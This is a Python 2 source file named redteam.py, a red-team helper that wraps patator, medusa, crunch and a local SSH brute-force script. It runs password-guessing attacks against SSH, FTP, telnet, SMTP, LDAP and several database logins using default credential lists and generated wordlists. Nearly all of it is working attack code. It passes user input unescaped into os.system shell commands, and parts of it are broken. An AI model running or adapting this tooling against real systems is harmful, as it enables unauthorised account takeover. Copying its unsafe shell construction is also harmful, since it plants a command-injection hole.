#Programmer: Brent E. Chambers
#Date: 12/4/2016
#Filename: redteam.py
#Description:

'''
Dev notes:  Bake the functionality in so it's not so dependent


'''

import os
import xmltodict
from sets import Set


global ghost 
global gport

global RESULTS_FILE 
RESULTS_FILE = './nmap_results.xml'

global USERFILE
USERFILE = './default_users.txt'

global PASSFILE 
PASSFILE = './default_pass.txt'


def remove_dupes(jaja):
	uniqueList = Set(jaja)
	return uniqueList


def cp_collect():
	master =[]
	while 1:
		host = raw_input("Item: ")
		if host == "done":
			unique_master = remove_dupes(master)
			return unique_master
		master.append(host)
	unique_master = remove_dupes(master)
	return unique_master



class brute:
    host = ''
    port = ''
    userfile = '/opt/Weapons/default_users.txt'
    passfile = '/opt/Weapons/default_pass.txt'
    crunchfile = '/opt/Weapons/cunch_file.txt'
    patator_dict_val = {'ssh':'ssh_login',
                'ftp':'ftp_login',
                'telnet':'telnet_login',
                'smtp':'smtp_login',
                'pop':'pop_login',
                'ldap':'ldap_login',
                'mysql':'mysql_login',
                'mssql':'mssql_login',
                'oracle':'oracle_login'}
    

    def __init__(self):
        pass
	list()

    def list(self):
	for item in dir(self):
		print item



    def add_passwords(self):
	master = []
	print "Add new passwords: "

	#New passwords
	collect = cp_collect()
	

	#Old passwords
	passwords = open(self.passfile)
	pass_array = []
	for item in passwords.readlines():
		pass_array.append(item[:-1])
		master.append(item[:-1])
	for i in collect:
		master.append(i)
	print "Old password count: ", len(pass_array)
	print "New password count: ", len(master)
	
	for p in master:
		print p
	os.remove('/opt/Weapons/default_pass.txt')
	newfile = open('/opt/Weapons/default_pass.txt', 'w')
	for tem in master:
		newfile.write(tem+"\n")
	newfile.close()

    # Python based ssh brute force script for a specified user.  Low+Slow.  Adjust via source code edit.  
    def py_ssh_brute_user(self, host, user):
        print "[+] ******* Testing for new user:", user
        cmd = 'python ./ssh_brute.py -H ' + host + ' -u ' + user + ' -F ' + self.passfile
        os.system(cmd)


    # Python based ssh brute force script for all default accounts.  Low+Slow.  Adjust via source code edit. 
    def py_ssh_brute(self, host):
	open_file = open(self.userfile)
	for item in open_file:
		print "[+] ******* Testing for new user:", item[:-1]
		cmd = 'python ./ssh_brute.py -H ' + host + ' -u ' + item[:-1] + ' -F ' + self.passfile
		#print cmd
		os.system(cmd)

    # Patator (3P) scanner can scan a variety of protocols.  Fast.  
    def patator_brute(self, proto, host):
	cmd = 'patator ' + self.patator_dict_val[proto] + ' host=' + host + ' user=FILE0 password=FILE1 0=' + self.userfile + ' 1=' + self.passfile + ' -x ignore:mesg=\'Authentication failed.\' -x ignore,reset,retry:code=500'
	print cmd
	os.system(cmd)


    def medusa_brute_user(self, host, user, proto='ssh'):
	cmd = 'medusa -h ' + host + ' -u ' + user + ' -P ' + self.passfile + ' -M ' + proto
	print cmd
	os.system(cmd)

	
    def generate_passlist(self, basepass, numb='20@@'):
	count = len(basepass)
	dynIncrement = len(numb)
	totes = count + dynIncrement
	
	year2000 = '20@@'
	year1900 = '19@@'
	single = '@'
	cmd = 'crunch ' + str(totes) + ' ' + str(totes) + ' 0123456789 -t ' + basepass + numb + ' -o /opt/Weapons/crunch_file.txt'
	os.system(cmd)

    def switch_to_crunch(self):
	self.passfile = '/opt/Weapons/crunch_file.txt'
	print "Active password file: ", self.passfile

    def switch_to_pass(self):
	self.passfile = '/opt/Weapons/default_pass.txt'
	print "Active password file: ", self.passfile

    def custom_brute_user(self):
	host = raw_input("Host: ")
	username = raw_input("User: ")
	basepass = raw_input("Base pass: ")
	wildcard = raw_input("Wildcard: ")
	self.generate_passlist(basepass, wildcard)
	self.switch_to_crunch()
	#self.medusa_brute_user(host, username)
	self.py_ssh_brute_user(host, username)
	self.switch_to_pass()



'''
class discovery:
	results_file = '/opt/Weapons/nmap_results.xml'
	

	def __init__(self):
		pass

	def parse(self, xml=self.results_file):
		results = open(xml)
		data = results.read()
		xdata = xmltodict.parse(data)
		return xdata

	def extract_hosts(self):
		xdata = self.parse()
		

'''

		
